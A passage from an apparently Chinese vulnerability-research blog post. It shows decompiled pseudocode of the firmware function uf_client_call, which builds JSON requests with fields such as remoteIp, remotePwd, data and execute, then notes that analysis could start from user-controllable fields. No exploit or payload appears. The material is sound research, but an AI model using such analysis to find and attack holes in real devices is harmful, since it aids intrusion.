class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_client_call</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v12; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v36; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v38; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v42; <span class="comment">// $t0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v43; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v44; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v47; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v48; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v49; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> v53[<span class="number">128</span>]; <span class="comment">// [sp+30h] [-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v54; <span class="comment">// [sp+B0h] [-10h]</span></span><br><span class="line">  <span class="type">int</span> v55; <span class="comment">// [sp+B4h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// [sp+B8h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v55 = <span class="number">0</span>;</span><br><span class="line">    v54 = <span class="number">38</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  getpid();</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">4</span>) || !*(_DWORD *)(a1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)cmd or module is null&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = json_object_new_object();</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)json_object_new_object failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_DWORD *)a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v14 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">10</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v14, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">453</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v14;</span><br><span class="line">      v12 = <span class="string">&quot;acConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v13 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">11</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v13, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">443</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v13;</span><br><span class="line">      v12 = <span class="string">&quot;devConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v7 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v7, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">433</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v7;</span><br><span class="line">      v12 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v15 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v15, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">463</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v15;</span><br><span class="line">      v12 = <span class="string">&quot;devCap.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v16 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">7</span>;</span><br><span class="line">      v17 = <span class="built_in">calloc</span>(v16, <span class="number">1</span>);</span><br><span class="line">      v8 = v17;</span><br><span class="line">      <span class="keyword">if</span> ( !v17 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">473</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)malloc failed!&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, v9);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = v17;</span><br><span class="line">      v11 = v16;</span><br><span class="line">      v12 = <span class="string">&quot;ufSys.%s&quot;</span>;</span><br><span class="line">LABEL_22:</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">snprintf</span>(v10, v11, v12, v6) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(v8);</span><br><span class="line">LABEL_24:</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)method snprintf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v18 = json_object_new_string(v8);</span><br><span class="line">      <span class="built_in">free</span>(v8);</span><br><span class="line">      <span class="keyword">if</span> ( !v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_method failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v4, <span class="string">&quot;method&quot;</span>, v18);</span><br><span class="line">      v19 = json_object_new_object();</span><br><span class="line">      <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_param failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v20 = json_object_new_string(*(_DWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">if</span> ( !v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v19);</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_module failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;module&quot;</span>, v20);</span><br><span class="line">      v21 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v21 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      v22 = json_object_new_string(v21);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;remoteIp&quot;</span>, v22);</span><br><span class="line">LABEL_34:</span><br><span class="line">      v23 = *(_DWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = json_object_new_string(v23);</span><br><span class="line">        <span class="keyword">if</span> ( !v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_passwd failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;remotePwd&quot;</span>, v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">36</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = json_object_new_int();</span><br><span class="line">        <span class="keyword">if</span> ( !v25 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_40:</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_remoteip failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;buf&quot;</span>, v25);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)a1 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">45</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">42</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v28 )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = v19;</span><br><span class="line">            v30 = <span class="string">&quot;execute&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">43</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v27 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v27 )</span><br><span class="line">            json_object_object_add(v19, <span class="string">&quot;force&quot;</span>, v27);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">44</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v28 )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = v19;</span><br><span class="line">            v30 = <span class="string">&quot;configId_not_change&quot;</span>;</span><br><span class="line">LABEL_54:</span><br><span class="line">            json_object_object_add(v29, v30, v28);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v26 = *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">45</span>);</span><br><span class="line">LABEL_56:</span><br><span class="line">      <span class="keyword">if</span> ( v26 )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v31 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;from_url&quot;</span>, v31);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">47</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;from_file&quot;</span>, v32);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">48</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;multi&quot;</span>, v33);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">46</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v34 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;not_commit&quot;</span>, v34);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">40</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = json_object_new_boolean(*(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">41</span>) ^ <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;async&quot;</span>, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      v36 = *(_BYTE **)(a1 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v36 || !*v36 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      v37 = json_object_new_string(v36);</span><br><span class="line">      <span class="keyword">if</span> ( !v37 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;data&quot;</span>, v37);</span><br><span class="line">LABEL_75:</span><br><span class="line">      v38 = *(_BYTE **)(a1 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v38 &amp;&amp; *v38 )</span><br><span class="line">      &#123;</span><br><span class="line">        v39 = json_object_new_string(v38);</span><br><span class="line">        <span class="keyword">if</span> ( !v39 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_78:</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_data failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;device&quot;</span>, v39);</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v4, <span class="string">&quot;params&quot;</span>, v19);</span><br><span class="line">      v40 = json_object_to_json_string(v4);</span><br><span class="line">      <span class="keyword">if</span> ( !v40 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new json_object_to_json_string send buf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v41 = uf_socket_client_init(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v41 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        v42 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">12</span>);</span><br><span class="line">        v43 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>);</span><br><span class="line">        v44 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>);</span><br><span class="line">        v45 = *(_DWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v42 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v45 )</span><br><span class="line">          &#123;</span><br><span class="line">            syslog(</span><br><span class="line">              <span class="number">3</span>,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, caller: %s [ctype:%d  %s -m %s %s]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_client_call&quot;</span>,</span><br><span class="line">              <span class="number">651</span>,</span><br><span class="line">              *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">16</span>),</span><br><span class="line">              *(_DWORD *)a1,</span><br><span class="line">              v43,</span><br><span class="line">              v44,</span><br><span class="line">              v42);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          syslog(</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, [ctype:%d  %s -m %s %s]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !v45 )</span><br><span class="line">          &#123;</span><br><span class="line">            syslog(</span><br><span class="line">              <span class="number">3</span>,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, [ctype:%d %s -m %s]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_client_call&quot;</span>,</span><br><span class="line">              <span class="number">662</span>,</span><br><span class="line">              *(_DWORD *)a1,</span><br><span class="line">              v43,</span><br><span class="line">              v44);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          syslog(</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, caller: %s [ctype:%d %s -m %s]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v46 = <span class="built_in">strlen</span>(v40);</span><br><span class="line">      uf_socket_msg_write(v41, v40, v46);</span><br><span class="line">      json_object_put(v4);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">40</span>) &amp;&amp; *(_BYTE *)(a1 + <span class="number">41</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_socket_close(v41);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v56 = <span class="number">1</span> &lt;&lt; (v41 &amp; <span class="number">0x1F</span>);</span><br><span class="line">      v47 = &amp;v53[<span class="number">4</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)v41 &gt;&gt; <span class="number">5</span>)];</span><br><span class="line">      v48 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v50 = <span class="number">4</span> * v48;</span><br><span class="line">    <span class="keyword">if</span> ( v48 &lt; <span class="number">0x20</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    *(_DWORD *)v47 |= v56;</span><br><span class="line">    v51 = select(v41 + <span class="number">1</span>, v53, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v51 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_socket_close(v41);</span><br><span class="line">      syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)select timeout[%s]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v51 &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v49 = (_DWORD *)_errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( (*v49 &amp; <span class="number">0xFFFFFFF7</span>) != <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_socket_close(v41);</span><br><span class="line">      strerror(*v49);</span><br><span class="line">      syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)select error %s&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)socket EINTR or ENOMEM [%d]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, <span class="number">691</span>, *v49);</span><br><span class="line">    v48 = <span class="number">0</span>;</span><br><span class="line">    v50 = <span class="number">0</span>;</span><br><span class="line">LABEL_98:</span><br><span class="line">    *(_DWORD *)&amp;v53[v50] = <span class="number">0</span>;</span><br><span class="line">    ++v48;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ((*(<span class="type">int</span> *)v47 &gt;&gt; (v41 &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v52 = uf_socket_msg_read(v41, a2);</span><br><span class="line">    uf_socket_close(v41);</span><br><span class="line">    <span class="keyword">if</span> ( v52 &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v52;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)FD_ISSET failed[%s]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, <span class="number">710</span>, *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>));</span><br><span class="line">    uf_socket_close(v41);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然这里有400行，但是或许有个思路便是从可控字段出发分析</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br></pre></td></tr></table></figure>

